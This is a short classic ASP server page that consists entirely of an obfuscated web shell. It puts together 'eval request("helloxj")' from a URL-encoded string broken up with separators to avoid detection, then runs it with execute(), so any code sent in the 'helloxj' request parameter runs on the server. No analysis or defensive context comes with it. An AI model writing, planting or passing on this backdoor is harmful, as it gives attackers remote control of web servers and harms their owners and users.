<%
dim a,b,temp,c
a="eva@@l%20req@@uest%28%22helloxj%22%29"
b=replace(a,"@@","��")
c=split(b,"��")
for i=0 to ubound(c)
temp=temp+c(i)
next
execute(unescape(temp))
%>